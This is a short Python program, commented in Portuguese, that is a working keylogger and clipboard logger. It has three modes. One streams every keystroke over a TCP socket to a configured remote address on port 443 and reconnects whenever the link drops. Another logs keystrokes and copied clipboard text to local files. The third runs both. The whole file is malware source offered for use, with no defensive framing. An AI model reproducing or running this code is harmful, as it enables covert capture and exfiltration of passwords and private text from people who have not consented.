import socket # Para envio de teclas para alguma conexão
import keyboard # Para função de captura de teclas
import pyperclip # Para funão de clipboard
import time
import multiprocessing
import sys

ip = "192.168.15.100" # Defina o endereço ip
porta = 443 # Defina a porta

arquivo_ctrl_c = "" # defina o caminho do arquivo clipboard salvo localmente
arquivo_log = "" # defina o caminho do arquivo de captura de teclas localmente

# Função envio de teclas para alguma conexão repetidamente.
def rede():
    global ip, porta
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, porta))
            while True:   
                tecla = keyboard.read_event()
                if tecla.event_type == keyboard.KEY_DOWN:
                    tecla_nome = str(tecla.name)
                    try:
                        sock.send(tecla_nome.encode())
                    except (BrokenPipeError, ConnectionResetError):
                        break
        except (ConnectionError, TimeoutError): # em caso de erro de conexão, espera 5 segundose tenta de conectar novamente
            time.sleep(5)
        finally:
            sock.close()

# Obtém a cópia do clipboard do pc.
def log_copia():
    global arquivo_ctrl_c
    texto = ""
    with open(fr'{arquivo_ctrl_c}', 'a', encoding='utf-8') as log_arquivo_ctrl:
        while True:
            novo_texto = pyperclip.paste()
            if novo_texto != texto:
                log_arquivo_ctrl.write(f"[\nTexto copiado:\n{novo_texto}\n]\n")
                log_arquivo_ctrl.flush()
                texto = novo_texto
            time.sleep(1) 


# Captura as teclas digitadas
def log():
    global arquivo_log
    with open(fr'{arquivo_log}', "a", encoding='utf-8') as log_arquivo:
        while True:
            tecla = keyboard.read_event()
            if tecla.event_type == keyboard.KEY_DOWN:
                tecla_nome = str(tecla.name)
                log_arquivo.write(f'[{tecla_nome}] ')
                log_arquivo.flush() # usado para não causar interferência quando escrever no arquivo 



def main():

    if len(sys.argv) < 1:
        sys.exit()
    elif len(sys.argv) > 1:
        match sys.argv[1]:
            case "rede":
                rede_processo = multiprocessing.Process(target=rede)
                rede_processo.start()
                rede_processo.join()

            case "local":
                log_processo = multiprocessing.Process(target=log)
                clipboard_processo = multiprocessing.Process(target=log_copia)
                
                log_processo.start()
                clipboard_processo.start()


                log_processo.join()
                clipboard_processo.join()

            case "ambos":
                rede_processo = multiprocessing.Process(target=rede)
                log_processo = multiprocessing.Process(target=log)
                clipboard_processo = multiprocessing.Process(target=log_copia)

                rede_processo.start()
                log_processo.start()
                clipboard_processo.start()

                rede_processo.join()
                log_processo.join()
                clipboard_processo.join()
            case _:
                sys.exit()


if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
